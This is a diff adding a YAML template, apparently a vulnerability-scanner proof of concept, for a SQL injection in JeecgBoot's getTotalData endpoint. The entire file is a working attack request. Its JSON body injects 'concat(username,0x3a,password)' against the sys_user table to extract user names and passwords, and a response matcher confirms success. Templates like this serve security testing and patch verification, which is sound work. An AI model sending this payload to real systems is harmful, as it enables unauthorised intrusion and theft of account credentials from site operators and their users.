@@ -1,0 +1,19 @@
+name: JeecgBoot-getTotalData-SQL注入
+description: >-
+  SQL注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /jeecg-boot/drag/onlDragDatasetHead/getTotalData
+    headers:
+      Content-Type: application/json
+    body: >-
+      {"tableName":"sys_user","compName":"","condition":{"filter":{}},"config":{"assistValue":[],"assistType":[],"name":[{"fieldName":"concat(username,0x3a,password)","fieldType":"string"},{"fieldName":"id","fieldType":"string"}],"value":[{"fieldName":"id","fieldType":"1"}],"type":[]}}
+    expression:
+      status: 200
+      headers:
+        Content-Type: application/json
+      body_all:
+        - "success"
+        - "true"
